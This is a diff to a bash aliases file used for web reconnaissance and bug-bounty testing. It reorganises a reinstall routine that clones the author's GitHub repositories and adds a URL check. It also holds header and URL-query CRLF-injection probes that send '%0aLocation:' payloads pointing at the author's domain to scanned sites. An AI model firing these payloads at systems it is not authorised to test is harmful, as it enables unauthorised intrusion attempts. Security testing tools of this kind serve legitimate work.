@@ -8,14 +8,14 @@ reload(){
 reinstall(){
 	echo -e "\e[32m"
 	cd ~/
-	mkdir -p ~/tools/{__diccionarios,recon}
+	mkdir -p ~/tools/{__diccionarios,recon,results,cron}
 	git clone https://github.com/estebancano-dev/BashAliases.git
-	cp ~/BashAliases/.bash_aliases ~/
-	rm -R ~/BashAliases 
+	mv ~/BashAliases/.bash_aliases ~/
 	git clone https://github.com/estebancano-dev/commonwords.git
-	cp ~/commonwords/*.* ~/tools/__diccionarios
+	mv ~/commonwords/*.* ~/tools/__diccionarios
 	gunzip -f ~/tools/__diccionarios/1-5.txt.gz
-	rm -R ~/commonwords 
+	git clone https://github.com/estebancano-dev/crons.git
+	mv ~/crons/* ~/tools/crons
 	reload
 	echo -e "\033[0m"
 }
@@ -238,7 +238,6 @@ subdomains(){
 	echo -e "\e[32m************ Vulnerabilities test... **********\033[0m" | tee -a salida.txt
 	count=$(cat "resolved$1.txt" | wc -l)
 	echo -e "\e[32m\tGetting Wayback urls for $count urls... \033[0m" | tee -a salida.txt
-	regex='(https?)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'
 	for dom in `cat resolved$1.txt`; do 
 		now=$(date +"%Y%m%d%H%M%S")
 		echo "$dom" | waybackurls | sort -u -o l$now.txt
@@ -357,25 +356,28 @@ checkheadersforinjection(){
 	fi
 	i=0
 	cat $1 | while read url; do
-		response=$(curl -sLiH "User-agent:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection%0a" $url)
-		if [[ $response == *"<!-- CH3CK -->"* ]]; then
-			echo "\r\n*** Header User-agent injected: User-agent:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection in $url" >> $2
-			((i++))
-		fi
-		response=$(curl -H "User-agent:" -sLiH "X-forwarded-for:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection%0a" $url)
-		if [[ $response == *"<!-- CH3CK -->"* ]]; then
-			echo "\r\n*** Header X-forwarded-for injected: X-forwarded-for:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection in $url" >> $2
-			((i++))
-		fi
-		response=$(curl -H "User-agent:" -sLiH "Referer:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection%0a" $url)
-		if [[ $response == *"<!-- CH3CK -->"* ]]; then
-			echo "\r\n*** Header Referer injected: Referer:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection in $url" >> $2
-			((i++))
-		fi
-		response=$(curl -sLiH "User-agent:" $url?%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection%0a)
-		if [[ $response == *"<!-- CH3CK -->"* ]]; then
-			echo "\r\n*** Url query injected: $url?%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection%0a in $url" >> $2
-			((i++))
+		regex='(https?)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'
+		if [[ $url =~ $regex ]]; then 
+			response=$(curl -sLiH "User-agent:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection%0a" $url)
+			if [[ $response == *"<!-- CH3CK -->"* ]]; then
+				echo "\r\n*** Header User-agent injected: User-agent:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection in $url" >> $2
+				((i++))
+			fi
+			response=$(curl -H "User-agent:" -sLiH "X-forwarded-for:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection%0a" $url)
+			if [[ $response == *"<!-- CH3CK -->"* ]]; then
+				echo "\r\n*** Header X-forwarded-for injected: X-forwarded-for:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection in $url" >> $2
+				((i++))
+			fi
+			response=$(curl -H "User-agent:" -sLiH "Referer:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection%0a" $url)
+			if [[ $response == *"<!-- CH3CK -->"* ]]; then
+				echo "\r\n*** Header Referer injected: Referer:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection in $url" >> $2
+				((i++))
+			fi
+			response=$(curl -sLiH "User-agent:" $url?%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection%0a)
+			if [[ $response == *"<!-- CH3CK -->"* ]]; then
+				echo "\r\n*** Url query injected: $url?%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection%0a in $url" >> $2
+				((i++))
+			fi
 		fi
 	done
 	echo -e "\e[32m\tFound $i headers injected... \033[0m"
